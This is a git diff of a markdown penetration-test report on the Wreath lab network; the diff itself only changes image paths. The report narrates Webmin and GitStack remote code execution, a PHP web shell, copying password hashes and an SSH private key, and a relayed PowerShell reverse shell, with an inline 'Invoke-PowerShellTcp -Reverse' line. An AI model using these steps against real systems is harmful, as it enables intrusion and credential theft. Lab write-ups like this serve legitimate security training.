@@ -17,7 +17,7 @@ tags:   [SQLi, SMTP, RCE, APT]
 
 <span>A look into the exploitation of a vulnerable network and “secure” PC.</span>
 
-<span class="c0 c39 c71">   </span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 333.50px; height: 344.19px;">![](images/0xd4y-logo-gray.png)</span>
+<span class="c0 c39 c71">   </span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 333.50px; height: 344.19px;">![](_reports/Wreath/0xd4y-logo-gray.png)</span>
 
 **This report can be read both on this site, and as its <a href = "https://zezul.github.io/reports/Writer%20Writeup.pdf">original report form</a>. It is highly recommended that you read the original report form instead because it is better formatted.**
 
@@ -142,37 +142,37 @@ tags:   [SQLi, SMTP, RCE, APT]
 
 <span>As with all penetration tests, I started by enumerating the ports of the target. This is an important step, as it is useful in identifying possible attack vectors. The services and versions of our target can be enumerated using the nmap tool and giving it the flags</span> <span class="c0">-sC</span> <span>and</span> <span class="c0">-sV</span><span>. The</span> <span class="c0">-sC</span><span>flag runs nmap’s default scripts, while the</span> <span class="c0">-sV</span><span>flag detects the versions of the scanned services. Note that knowing the version of a service is essential in determining the likelihood of it being vulnerable (old versions tend to have more known vulnerabilities, as they have been exposed to the warzone of the internet for a longer period of time). We can enumerate all open ports with the</span> <span class="c0">-p-</span><span>flag and output all formats with the</span> <span class="c0">-oA</span><span class="c1"> flag.</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 206.67px;">![](images/image28.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 206.67px;">![](_reports/Wreath/image28.png)</span>
 
 <span class="c1">We see that there are only four ports open. From the nmap scan, observe that the target machine is running an HTTP and HTTPS server on ports 80 and 443 respectively. It’s important to notice that it is running Apache httpd 2.4.37 which belongs to the CentOS Linux distribution. Therefore, it’s very likely that the target is running CentOS.</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 400.62px; height: 108.50px;">![](images/image43.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 400.62px; height: 108.50px;">![](_reports/Wreath/image43.png)</span>
 
 <span>Using the curl tool to send a GET request to the server, we see that it is trying to redirect us to</span> <span class="c0">https://thomaswreath.thm</span><span class="c1">. However, the DNS of the target is not set up, as can be observed from the domain not being able to route us to the requested website.</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 397.50px; height: 47.01px;">![](images/image38.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 397.50px; height: 47.01px;">![](_reports/Wreath/image38.png)</span>
 
 <span>Currently, this domain is not recognized by any of our</span> <span>VirtualHost</span><sup>[[2]](#ftnt2)</sup><span> </span><span>definitions. However, adding</span> <span class="c0">thomaswreath.thm</span><span>to the</span> <span class="c0">/etc/hosts</span><span class="c1"> file (the file in Linux which is responsible for mapping hostnames to IP addresses), and running the same curl command again produces a different output:.</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 256.00px; height: 20.00px;">![](images/image5.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 256.00px; height: 20.00px;">![](_reports/Wreath/image5.png)</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 433.50px; height: 100.04px;">![](images/image21.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 433.50px; height: 100.04px;">![](_reports/Wreath/image21.png)</span>
 
 <span>We can add the</span> <span class="c0">-k</span><span class="c1"> flag to specify that we don’t care to verify the server’s certificate (note this is insecure but it is fine in the context of this test):</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 456.50px; height: 158.02px;">![](images/image65.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 456.50px; height: 158.02px;">![](_reports/Wreath/image65.png)</span>
 
 <span class="c1">And now we get what looks to be a webpage. Browsing to this domain through Firefox, we reach yet another warning:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 471.50px; height: 139.03px;">![](images/image7.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 471.50px; height: 139.03px;">![](_reports/Wreath/image7.png)</span>
 
 <span class="c1">One thing that’s important to do before proceeding to the website is to check the server certificate. The certificate could give information about more domains that the web server may have, as well as some other useful information like names, locations, and email addresses. This can be checked by clicking on the “Advanced'' box, and then clicking on the “View Certificate” link. I didn’t see anything too interesting, but there is one email address:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 281.00px; height: 27.00px;">![](images/image45.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 281.00px; height: 27.00px;">![](_reports/Wreath/image45.png)</span>
 
 <span class="c1">I now proceeded to the website and was met with the following page:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 524.50px; height: 249.64px;">![](images/image39.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 524.50px; height: 249.64px;">![](_reports/Wreath/image39.png)</span>
 
 ### <span class="c27 c0">RCE Exploitation</span>
 
@@ -182,11 +182,11 @@ tags:   [SQLi, SMTP, RCE, APT]
 
 <span class="c1">Seeing as this is a well known vulnerability, Metasploit already had a script to exploit this version of Webmin:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 570.50px; height: 149.94px;">![](images/image49.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 570.50px; height: 149.94px;">![](_reports/Wreath/image49.png)</span>
 
 <span class="c1">After setting the LHOST and RHOST, I ran the exploit and got a shell!</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 491.50px; height: 92.16px;">![](images/image47.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 491.50px; height: 92.16px;">![](_reports/Wreath/image47.png)</span>
 
 <span>The web server was running as root!</span><span> </span><span>It is better practice to run a web service as a low-privileged user such as</span> <span class="c0">www-data</span><span class="c1"> just in case the web server gets compromised.</span>
 
@@ -194,21 +194,21 @@ tags:   [SQLi, SMTP, RCE, APT]
 
 <span class="c1">As root, the highest-privileged Linux user, we can extract the hash of users on the system and try to crack it. It’s possible that this same password is used in some other machine on the network.  </span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 464.00px; height: 44.00px;">![](images/image58.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 464.00px; height: 44.00px;">![](_reports/Wreath/image58.png)</span>
 
 <span>Providing the</span> <span class="c0">--example-hashes</span><span>flag in</span> <span class="c0">hashcat</span><span>(a tool for cracking hashes) and grepping for</span> <span class="c0">unix</span><span>, we can see that the mode for the</span> <span class="c0">/etc/shadow</span> <span>hashes is 1800 (</span><span class="c2">note that the hash corresponding to mode 1800 looks most similar to the hashes in the /etc/shadow file</span><span class="c1">).</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 539.50px; height: 149.57px;">![](images/image27.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 539.50px; height: 149.57px;">![](_reports/Wreath/image27.png)</span>
 
 <span class="c1">Alternatively, another way to determine the identity of a hash is by using tools such as hashid or hash-identifier:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 618.50px; height: 44.60px;">![](images/image37.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 618.50px; height: 44.60px;">![](_reports/Wreath/image37.png)</span>
 
 <span class="c1">The password used for the root user is secure enough to not be cracked by the rockyou.txt file, so I copied this hash to examine for later if needed.</span>
 
 <span>After compromising the root user, I maintained persistence by going into</span> <span class="c0">/root/.ssh/id_rsa</span><span class="c1"> and copying the contents of the id_rsa file (this is a private key which is used to authenticate a client to a server).</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 521.67px; height: 147.87px;">![](images/image29.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 521.67px; height: 147.87px;">![](_reports/Wreath/image29.png)</span>
 
 ## <span class="c44 c0 c39 c56"></span>
 
@@ -218,7 +218,7 @@ tags:   [SQLi, SMTP, RCE, APT]
 
 <span>With full access on</span><span> one of the three machines on the Wreath network, I enumerated the internal network to find any other systems by using nmap on the compromised system (a static binary of it can be downloaded on GitHub</span><sup>[[4]](#ftnt4)</sup><span>).</span><span>To speed up the process, I added the</span> <span class="c0">-sn</span><span class="c1"> flag which disables port scans.</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 495.50px; height: 256.57px;">![](images/image33.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 495.50px; height: 256.57px;">![](_reports/Wreath/image33.png)</span>
 
 <span>We see that there are a total of four other machines on the internal network (</span><span class="c2">note we are 10.200.111.200</span><span>). I was told by the client that the host ending in</span> <span class="c0">.1</span><span>is part of the AWS infrastructure used for creating the network, and the host ending in</span> <span class="c0">.250</span><span>is the OpenVPN server. As such, we will focus on the two hosts ending in</span> <span class="c0">.100</span><span>and</span> <span class="c0">.150</span><span class="c1">.</span>
 
@@ -226,7 +226,7 @@ tags:   [SQLi, SMTP, RCE, APT]
 
 <span class="c1">After discovering these two hosts, I enumerated their ports:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 556.50px; height: 123.96px;">![](images/image34.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 556.50px; height: 123.96px;">![](_reports/Wreath/image34.png)</span>
 
 <span class="c1">Observe that all of the ports on the .100 machine are filtered, but the .150 computer has three ports open (80, 3389, and 5985). It’s important to note that it’s likely this is a Windows machine due to ports 3389 (typically reserved for RDP) and 5985 (WRM / WinRM) being open.</span>
 
@@ -234,11 +234,11 @@ tags:   [SQLi, SMTP, RCE, APT]
 
 <span>The HTTP service on port 80 is a good one to forward because web servers have a big attack surface (I chose to forward this port to localhost on port 18020 using</span> <span class="c0">ssh</span><span class="c1">).</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 562.50px; height: 65.25px;">![](images/image48.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 562.50px; height: 65.25px;">![](_reports/Wreath/image48.png)</span>
 
 <span>Now when I visited</span> <span class="c0">localhost:18020</span><span class="c1">, I was met with a web page:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 559.50px; height: 132.70px;">![](images/image32.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 559.50px; height: 132.70px;">![](_reports/Wreath/image32.png)</span>
 
 <span class="c1">Looking at the error on the webpage, we see that there are three directories:</span>
 
@@ -248,11 +248,11 @@ tags:   [SQLi, SMTP, RCE, APT]
 
 <span class="c1">The /user subdirectory under /rest discloses information about the users on the GitStack software, but I was unable to find anything that looked alarming.</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 196.00px; height: 29.00px;">![](images/image44.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 196.00px; height: 29.00px;">![](_reports/Wreath/image44.png)</span>
 
 <span class="c1">Visiting /gitstack redirected me to a login page on /registration/login:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 256.83px; height: 223.33px;">![](images/image50.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 256.83px; height: 223.33px;">![](_reports/Wreath/image50.png)</span>
 
 <span class="c1">There is a nice handy message that says the default username and password is admin/admin, but trying it out reveals that the credentials for this login page have since been changed. The source code of the page did not reveal anything either.</span>
 
@@ -260,7 +260,7 @@ tags:   [SQLi, SMTP, RCE, APT]
 
 <span>However, knowing that this machine is only available on the internal network, it is possible that its software is not updated. The outdated software of this website is especially alarming when looking at the output of</span> <span class="c0">nikto</span><span class="c1">, a tool for scanning vulnerabilities on web servers:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 472.50px; height: 112.07px;">![](images/image9.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 472.50px; height: 112.07px;">![](_reports/Wreath/image9.png)</span>
 
 <span class="c50 c35 c2">Note the large amount of outdated software</span>
 
@@ -268,7 +268,7 @@ tags:   [SQLi, SMTP, RCE, APT]
 
 <span class="c1">It follows that the GitStack software used on the target might also be outdated and vulnerable. Searchsploit is a great tool for finding exploits for outdated software:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 479.50px; height: 209.78px;">![](images/image16.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 479.50px; height: 209.78px;">![](_reports/Wreath/image16.png)</span>
 
 <span>All three exploit results about GitStack are about the same version (namely 2.3.10). I then copied the exploit</span> <span class="c0">php/webapps/43777.py</span><span class="c1"> onto my local machine.</span>
 
@@ -276,11 +276,11 @@ tags:   [SQLi, SMTP, RCE, APT]
 
 <span class="c1">Before running this exploit, we will examine it to see how it works:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 535.50px; height: 37.76px;">![](images/image14.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 535.50px; height: 37.76px;">![](_reports/Wreath/image14.png)</span>
 
 <span>As can be seen from the image above, the password field is most likely vulnerable (as it turns out, the username field is also vulnerable). The python script injects PHP code into the password field, and the web server executes it. This critical</span> <span>vulnerability was caused by passing</span><span> unsanitized user input into an exec function</span><sup>[[5]](#ftnt5)</sup><span class="c1">:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 251.50px; height: 56.33px;">![](images/image15.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 251.50px; height: 56.33px;">![](_reports/Wreath/image15.png)</span>
 
 <span>When running the script, it uploads a PHP web shell called</span> <span class="c0">exploit.php</span><span>with the parameter</span> <span class="c0">‘a’</span><span class="c1"> to the /web directory (I modified the script and called it exploit-0xd4y.php, as it is good practice to change the default configurations of an exploit whether that be a password to a backdoor, parameters, etc).</span>
 
@@ -288,7 +288,7 @@ tags:   [SQLi, SMTP, RCE, APT]
 
 <span>I curled this web shell and provided it the</span> <span class="c0">-d</span><span class="c1"> flag to specify the data to be inputted:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 419.50px; height: 41.01px;">![](images/image13.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 419.50px; height: 41.01px;">![](_reports/Wreath/image13.png)</span>
 
 <span>And this web server is running as System, the highest-privileged Windows user (even higher than Administrator)!</span><span class="c72"> </span><span>I then tried to find a way to get a reverse shell from the exploited system. The first thing to test is to see if our attack box can be pinged from the target</span><span class="c0"> </span><span>(I made sure to use the</span> <span class="c0">-n</span><span class="c1"> flag to specify how many packets to send). It is extremely important to note this seemingly insignificant flag. If we were to not specify how many packets to send, the server would constantly be trying to ping us, and there would be no way for us to stop this command without somehow killing the process. A constant ping to our attack box would therefore look suspicious.</span>
 
@@ -296,11 +296,11 @@ tags:   [SQLi, SMTP, RCE, APT]
 
 <span class="c1">We can set up a tcpdump on the tun0 interface (the VPN routing path) and provide it with the icmp argument (Internet Control Message Protocol) so that we are only listening for pinging packets.</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 419.50px; height: 209.75px;">![](images/image40.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 419.50px; height: 209.75px;">![](_reports/Wreath/image40.png)</span>
 
 <span>Alas, I did not receive a response from the server. This meant that we cannot send a direct reverse shell from .150 to us. However, we can use</span> <span>nishang</span><sup>[[6]](#ftnt6)</sup><span> to get</span><span> a socat reverse shell relay. CentOS, the operating system of the compromised</span><span class="c0"> </span><span class="c1">.200 machine, has a very restrictive firewall called firewalld that will limit almost all inbound connections.</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 549.50px; height: 102.15px;">![](images/image46.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 549.50px; height: 102.15px;">![](_reports/Wreath/image46.png)</span>
 
 <span class="c35 c2">We can see that the firewall is</span> <span class="c2 c12">active</span>
 
@@ -316,21 +316,21 @@ tags:   [SQLi, SMTP, RCE, APT]
 
 1.  <span class="c1">We are going to set up a listening port on 20001 on the .200 machine and forward all traffic from that port to 20002 on our machine.</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 18.67px;">![](images/image35.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 18.67px;">![](_reports/Wreath/image35.png)</span>
 
 1.  <span class="c1">Next, we will set up netcat listening on port 20002 on our system:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 415.50px; height: 28.63px;">![](images/image66.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 415.50px; height: 28.63px;">![](_reports/Wreath/image66.png)</span>
 
 1.  <span>I used the Invoke-PowerShellTcp.ps1</span> <span>nishang</span><span>script and added</span> <span class="c0">Invoke-PowerShellTcp -Reverse -IPAddress 10.200.111.200 -Port 20001</span><span class="c1"> to the bottom of the script, so that when downloading the script using IEX (more on this later), each line in the script will be automatically executed giving us a reverse shell:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 146.67px;">![](images/image20.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 146.67px;">![](_reports/Wreath/image20.png)</span>
 
 <span class="c35 c2 c50">Note how we are sending the reverse shell to .200 on port 20001 (remember all traffic on port 20001 will be directed to our port 20002 on our machine).</span>
 
 1.  <span>Now, the firewall will block inbound connections for any ports that are not specified as exceptions. We have to tell the firewall which ports it should allow for connections by using the</span> <span class="c0">firewall-cmd</span><span class="c1"> command as such:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 521.50px; height: 69.37px;">![](images/image41.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 521.50px; height: 69.37px;">![](_reports/Wreath/image41.png)</span>
 
 <span class="c35 c2">Alternatively you can type</span> <span class="c35 c2 c0">systemctl stop firewalld</span><span class="c50 c35 c2"> to completely disable the firewall, though this is one of the noisiest actions a pentester can do, and it should only be done when it is an absolute necessity.</span>
 
@@ -339,65 +339,65 @@ tags:   [SQLi, SMTP, RCE, APT]
 1.  <span>Port 20003 will be the HTTP server on</span> <span class="c0">.200</span><span>which we can set up with</span> <span class="c0">python3 -m http.server 20003</span><span>; it will serve the powershell reverse shell file (which I renamed to</span> <span class="c0">0xd4y-rev.ps1</span><span class="c1">).</span>
 2.  <span class="c1">Finally, it’s time for the payload. We can download files / strings using IEX (Elixir’s Interactive Shell) in powershell.  </span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 546.50px; height: 49.04px;">![](images/image70.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 546.50px; height: 49.04px;">![](_reports/Wreath/image70.png)</span>
 
 <span class="c35 c2">Note the usage of three single quotes in the data argument to tell our bash shell to not interpret anything inside the quotes.</span>
 
 <span class="c1">Unfortunately, this payload did not work (most likely due to some special characters). I am running commands through a web shell, and therefore it is likely that the server is not understanding some of the special characters in the payload. This means that most likely we will have to url-encode the payload for it to work:        </span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 546.50px; height: 67.44px;">![](images/image64.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 546.50px; height: 67.44px;">![](_reports/Wreath/image64.png)</span>
 
 <span class="c1">Sure enough, when I executed this command, the output hanged and I got a hit on the python HTTP server!</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 439.50px; height: 39.23px;">![](images/image77.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 439.50px; height: 39.23px;">![](_reports/Wreath/image77.png)</span>
 
 <span>So now that</span> <span class="c0">0xd4y-rev.ps1</span><span class="c1"> was executed by the server, there should be a reverse shell getting sent to port 20001 on .200 which is getting forwarded to us on 20002:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 387.50px; height: 116.08px;">![](images/image17.png)</span>
